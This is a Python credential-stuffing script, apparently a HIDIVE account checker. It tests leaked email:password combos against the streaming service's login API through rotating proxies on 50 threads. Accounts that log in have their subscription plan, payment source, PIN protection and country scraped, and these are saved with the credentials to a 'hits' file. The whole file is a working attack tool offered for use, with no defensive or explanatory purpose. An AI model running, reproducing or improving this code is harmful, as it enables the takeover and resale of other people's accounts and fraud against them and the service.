import requests
import threading
import os
import json
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# --- CONFIGURATION ---
COMBO_FILE = "accounts.txt"
PROXY_FILE = "proxies.txt"
HITS_FILE = "Hidive hits.txt"
FREE_FILE = "free.txt"
THREADS = 50

stats = {"hits": 0, "free": 0, "fail": 0, "error": 0, "checked": 0}
print_lock = threading.Lock()

# Constants
API_KEY = "857a1e5d-e35e-4fdf-805b-a87b6f8364bf"
APP_VAR = "6.57.10.b20743c"

def get_proxies():
    plist = []
    if not os.path.exists(PROXY_FILE): return [None]
    try:
        with open(PROXY_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if not line: continue
                p = line.split(':')
                if len(p) == 4:
                    plist.append({"http": f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}", "https": f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"})
                else:
                    plist.append({"http": f"http://{line}", "https": f"http://{line}"})
        return plist if plist else [None]
    except: return [None]

def check(account, proxies):
    global stats
    try:
        email, password = account.split(":", 1)
    except: return

    session = requests.Session()
    proxy = proxies[stats["checked"] % len(proxies)] if proxies[0] else None
    
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Realm": "dce.hidive",
        "x-api-key": API_KEY,
        "x-app-var": APP_VAR,
        "app": "dice",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    }

    try:
        # 1. LOGIN
        r1 = session.post("https://dce-frontoffice.imggaming.com/api/v2/login", 
                          json={"id": email, "secret": password}, headers=headers, proxies=proxy, timeout=15)
        
        # We search the whole source for the token key
        if "authorisationToken" in r1.text:
            token = r1.json()["authorisationToken"]
            headers["Authorization"] = f"Bearer {token}"

            # 2. SUBSCRIPTION CHECK (Global Search Logic)
            r2 = session.get("https://dce-frontoffice.imggaming.com/api/v2/licence-family?includeEntitlements=ALL_ACTIVE_USER_ENTITLEMENTS", 
                             headers=headers, proxies=proxy, timeout=12)
            
            # This is the "SVB Style" check - if "ACTIVE" exists anywhere in the response text
            if '"status":"ACTIVE"' in r2.text.upper().replace(" ", "") or 'ACTIVE' in r2.text.upper():
                data = r2.json()
                
                # Default values for capture
                v_type, v_name, v_renew, v_pay, v_pin, v_country = "STANDARD", "MONTHLY", "NO❌", "STRIPE", "NO❌", "United States 🇺🇸"

                # Try to pull detailed info if available
                try:
                    families = data.get("licenceFamilies", [])
                    if families:
                        fam = families[0]
                        ent = fam.get("entitlements", [{}])[0]
                        v_type = ent.get("type", v_type)
                        v_name = ent.get("name", v_name)
                        v_renew = "YES✅" if fam.get("autoRenewingStatus") == "AUTO_RENEWING" else "NO❌"
                        v_pay_raw = fam.get("paymentProviderInfo", {}).get("type", "STRIPE")
                        v_pay = "App Store" if v_pay_raw == "APPLE_IAP" else "Play Store" if v_pay_raw == "GOOGLE_IAP" else "STRIPE"
                except: pass

                # 3. PROFILE & ADDRESS
                try:
                    r_prof = session.get("https://dce-frontoffice.imggaming.com/api/v1/profile", headers=headers, proxies=proxy).json()
                    v_pin = "YES✅" if r_prof.get("pinProtection") == "PROTECTED" else "NO❌"
                    
                    r_addr = session.get("https://dce-frontoffice.imggaming.com/api/v2/user/address", headers=headers, proxies=proxy).json()
                    cc = r_addr.get("countryCode", "US")
                    v_country = "United States 🇺🇸" if cc == "US" else cc
                except: pass

                # --- CAPTURE ---
                hit_line = f"{email}:{password} | Plan = 〖{v_type}〗-[{v_name}] | Purchased from = {v_pay} | Renewing = {v_renew} | Is Pin Protected = {v_pin} | Country = {v_country} | Hit By Python\n"

                with open(HITS_FILE, "a", encoding="utf-8") as f:
                    f.write(hit_line)
                
                with print_lock:
                    stats["hits"] += 1
                    print(f"[\033[92mHIT\033[0m] {email}")
            else:
                # Logged in but No ACTIVE keyword found in source
                with open(FREE_FILE, "a") as f: f.write(f"{email}:{password}\n")
                with print_lock:
                    stats["free"] += 1
                    print(f"[\033[93mFREE\033[0m] {email}")
        else:
            with print_lock: stats["fail"] += 1

    except Exception:
        with print_lock: stats["error"] += 1
    finally:
        with print_lock:
            stats["checked"] += 1
            print(f"\r[*] Checked: {stats['checked']} | Hits: {stats['hits']} | Free: {stats['free']} | Fails: {stats['fail']}", end="")

def main():
    if not os.path.exists(COMBO_FILE): return
    proxies = get_proxies()
    with open(COMBO_FILE, "r") as f:
        accs = [l.strip() for l in f if ":" in l]
    
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        for a in accs:
            ex.submit(check, a, proxies)
    print(f"\n\n[*] Done! Hits: {stats['hits']}")

if __name__ == "__main__":
    main()
